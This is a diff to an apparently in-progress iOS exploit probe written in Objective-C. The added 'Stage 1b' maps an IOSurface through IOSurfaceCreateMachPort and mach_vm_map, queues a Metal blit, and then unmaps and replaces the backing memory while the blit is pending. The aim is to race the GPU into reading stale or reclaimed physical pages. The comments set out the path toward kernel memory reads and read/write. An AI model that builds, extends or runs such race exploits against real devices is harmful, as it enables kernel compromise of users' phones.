@@ -57,7 +57,15 @@
 #import <unistd.h>
 #import <sys/mman.h>
 
-#define P119_BUILD      @"p119-staleupl-v1"
+#define P119_BUILD      @"p119-staleupl-v2"
+
+/* the P069 prototype law: mach_vm has no SDK header for these decls */
+kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
+                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
+                          mem_entry_name_port_t object, memory_object_offset_t offset,
+                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
+                          vm_inherit_t inheritance);
+kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
 #define P119_FILL_OLD   0x41   /* the attached backing's paint   */
 #define P119_FILL_STG   0x11   /* the staging buffer's paint     */
 #define P119_FILL_NEW   0x43   /* the replaced backing's paint   */
@@ -107,7 +115,7 @@ static uint64_t g_len;
 static IOSurfaceRef g_surf;
 static atomic_int g_stop;
 static atomic_ulong g_commits, g_det_ok, g_det_fail, g_rep_ok, g_rep_fail,
-                    g_for_hits, g_spray_hits, g_e0_hits;
+                    g_for_hits, g_spray_hits, g_e0_hits, g_unmap_ok;
 
 static id p119_unwrap(id buf) {
     for (int i = 0; i < 8; i++) {
@@ -358,6 +366,84 @@ static NSString *p119_finish(void) {
        atomic_load(&g_rep_fail), atomic_load(&g_commits),
        atomic_load(&g_for_hits), atomic_load(&g_e0_hits));
 
+    /* ---------- Stage 1b: the ENTRY-PORT unmap window (P069 route) ----------
+     v2 (2026-10-28, from the v1 device round: det_ok=2 vs det_fail=16857 —
+     the wirer holds the MD prepared ~always, the detach-first order rarely
+     reaches replace; and the fleet's A14-era C-shape verdict = "GART used
+     the NEW MD" = the GPU RE-READS at execution). The untested window =
+     the MD's OWN [md+0x98] gate: the IOMD law (note 272/re_iomd23) says
+     the map arm INCREMENTS the 16K-page gate and the UNMAP/deinit arm
+     RESET-0s it *while a queued submit still holds the captured UPL* —
+     if the gate reset frees/unwires the pages before the queued blit
+     executes, the GPU executes on a stale page list = the T020 window
+     reached through the SAME object the fleet already drives (P069, kr=0
+     device-proven route: IOSurfaceCreateMachPort + mach_vm_map). */
+    typedef mach_port_t (*p119IOSurfMachPort_t)(IOSurfaceRef);
+    p119IOSurfMachPort_t pMkPort = (p119IOSurfMachPort_t)dlsym(iosH, "IOSurfaceCreateMachPort");
+    if (pMkPort) {
+        L(@"");
+        L(@"--- Stage 1b: entry-port map → queued blit → unmap+replace → wait ---");
+        L(@"[IN FLIGHT] stage-1b window race begins — one tap per force-quit.");
+        atomic_ulong b_ok = 0, b_rep_fail = 0;
+        NSDate *t1b = [NSDate date];
+        for (int iter = 0; iter < 256 && -[t1b timeIntervalSinceNow] < 12.0; iter++) {
+            mach_port_t mp = pMkPort(g_surf);
+            if (!mp) break;
+            mach_vm_address_t addr = 0;
+            kern_return_t mkr = mach_vm_map(mach_task_self(), &addr,
+                                            (mach_vm_size_t)4096, 0, VM_FLAGS_ANYWHERE,
+                                            mp, 0, FALSE,
+                                            VM_PROT_READ | VM_PROT_WRITE,
+                                            VM_PROT_READ | VM_PROT_WRITE,
+                                            VM_INHERIT_NONE);
+            if (mkr != KERN_SUCCESS) {
+                mach_port_deallocate(mach_task_self(), mp);
+                continue;
+            }
+            /* queued blit (NO wait) — its UPL is captured at submit */
+            id<MTLCommandBuffer> cb = nil;
+            @autoreleasepool {
+                cb = [g_q commandBuffer];
+                if (!cb) goto bnext;
+                id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+                [enc copyFromBuffer:g_mbuf sourceOffset:0
+                           toBuffer:g_stage destinationOffset:0
+                               size:MIN(g_mbuf.length, g_stage.length)];
+                [enc endEncoding];
+                [cb commit];
+                /* race the queued blit: unmap (gate reset) + replace (sync
+                 * release old MD) while the blit is still queued */
+                kern_return_t ukr = mach_vm_deallocate(mach_task_self(), addr, 4096);
+                if (ukr == KERN_SUCCESS) atomic_fetch_add(&g_unmap_ok, 1);
+                int rk = g_repl(g_ref, g_data, g_len);
+                if (rk != 0) atomic_fetch_add(&b_rep_fail, 1);
+                [cb waitUntilCompleted];
+            }
+            atomic_fetch_add(&b_ok, 1);
+            {
+                uint8_t *s = (uint8_t *)g_stage.contents;
+                if (s) {
+                    int n11, n41, n43, ne0, n00, nfor;
+                    uint8_t ff;
+                    size_t scan = MIN((size_t)g_len, (size_t)4096);
+                    p119_classify(s, scan, &n11, &n41, &n43, &ne0, &n00, &nfor, &ff);
+                    if (nfor > 0 || ne0 > 0) {
+                        atomic_fetch_add(&g_for_hits, 1);
+                        Lf(@"[*** 1b iter=%d first=0x%02x for=%d e0=%d 41=%d 43=%d 11=%d ***]",
+                           iter, ff, nfor, ne0, n41, n43, n11);
+                    }
+                    memset(s, P119_FILL_STG, scan);
+                }
+            }
+        bnext:
+            usleep(1000);
+        }
+        Lf(@"[*] stage-1b done: rounds=%lu unmap_ok=%lu rep_fail=%lu",
+           atomic_load(&b_ok), atomic_load(&g_unmap_ok), atomic_load(&b_rep_fail));
+    } else {
+        L(@"[-] IOSurfaceCreateMachPort missing — stage 1b skipped honestly");
+    }
+
     /* ---------- Stage 2: the oracle verdict (T020 §Oracle) ---------- */
     L(@"");
     L(@"--- Stage 2: oracle ---");
@@ -461,6 +547,8 @@ static NSString *p119_finish(void) {
 
     L(@"");
     L(@"=== VERDICT (honest) ===");
+    L(@"- stage-1b is the v2 window (map → queued blit → UNMAP(gate reset) →");
+    L(@"  replace → wait); its hits join the stage-1/3 FOREIGN/0xE0 classes.");
     L(@"- spray hits > 0 = the GPU read THROUGH pages the spray reclaimed =");
     L(@"  the physical-read WINDOW receipt (probe-verified; still not KRW, not");
     L(@"  hasKread — the ttep read needs the stage-4 kernel-content step).");
